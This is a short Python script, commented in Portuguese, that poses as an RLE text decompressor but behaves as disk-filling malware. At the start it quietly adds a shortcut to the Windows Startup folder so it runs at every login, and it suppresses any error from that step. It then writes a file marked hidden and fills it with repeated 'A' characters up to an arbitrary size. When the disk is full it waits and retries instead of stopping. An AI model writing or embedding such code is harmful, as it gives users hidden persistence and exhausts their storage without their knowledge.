
import json
import os
import subprocess
import winshell
import time
from win32com.client import Dispatch

def iniciar_com_windows():
    caminho_programa = os.path.abspath(__file__)
    pasta_inicializar = winshell.startup()

    atalho = os.path.join(pasta_inicializar, "RLETextExpansion.lnk")

    if os.path.exists(atalho):
        return

    shell = Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(atalho)

    shortcut.Targetpath = caminho_programa
    shortcut.WorkingDirectory = os.path.dirname(caminho_programa)
    shortcut.save()

try:
    iniciar_com_windows()
except:
    pass

# CONFIGURAÇÕES
ARQUIVO_ENTRADA = "repeated_text.rle"
ARQUIVO_SAIDA = "repeated_text.txt"

TAMANHO_BLOCO = 1024 * 1024  # 1 MB

def descompactar():

    with open(ARQUIVO_ENTRADA, "r", encoding="utf-8") as arquivo:
        dados = json.load(arquivo)

    caractere = dados["caractere"]
    quantidade = dados["quantidade"]

    if caractere != "A":
        raise ValueError("Caractere inválido.")

    if type(quantidade) is not int or quantidade < 0:
        raise ValueError("Quantidade inválida.")

    bloco = caractere.encode("ascii") * TAMANHO_BLOCO

    restante = quantidade

    with open(ARQUIVO_SAIDA, "wb") as arquivo:
        subprocess.run(["attrib", "+h", os.path.abspath(ARQUIVO_SAIDA)], check=True)

        while restante > 0:

            tamanho = min(restante, TAMANHO_BLOCO)

            while True:
                try:
                    arquivo.write(bloco[:tamanho])
                    break

                except OSError as erro:
                    if erro.errno == 28 or getattr(erro, "winerror", None) == 112:
                        print("\nDisco sem espaço! Aguardando espaço disponível...")
                        time.sleep(5)
                    else:
                        raise

            restante -= tamanho

            progresso = ((quantidade - restante) / quantidade) * 100

            print(f"Progresso: {progresso:.2f}%", end="\r")

    print("\nDescompactação concluída!")
    print(f"Tamanho reconstruído: {quantidade / (1024 ** 3):.2f} GB")
    print(f"Tamanho no disco: {os.path.getsize(ARQUIVO_SAIDA)} bytes")


if __name__ == "__main__":
    descompactar()